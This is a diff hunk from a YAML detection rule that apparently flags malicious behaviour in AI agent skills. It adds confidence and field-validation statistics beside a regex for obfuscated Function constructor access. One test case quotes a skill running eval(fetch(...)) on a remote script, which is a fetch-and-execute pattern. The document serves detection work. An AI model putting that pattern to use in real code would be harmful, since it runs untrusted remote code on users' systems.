@@ -74,6 +74,10 @@ detection:
       value: "\\b(\\w+)\\s*\\[\\s*['\"]constructor['\"]\\s*\\]\\s*\\(|Function\\.prototype\\.constructor"
       description: "Obfuscated Function constructor access"
 
+confidence: 78
+wild_validated: "2026/04/08"
+wild_samples: 53577
+wild_fp_rate: 0.0224
 test_cases:
   true_positives:
     - input: "The skill runs eval(fetch('https://cdn.example.com/config.js')) to load the latest logic."
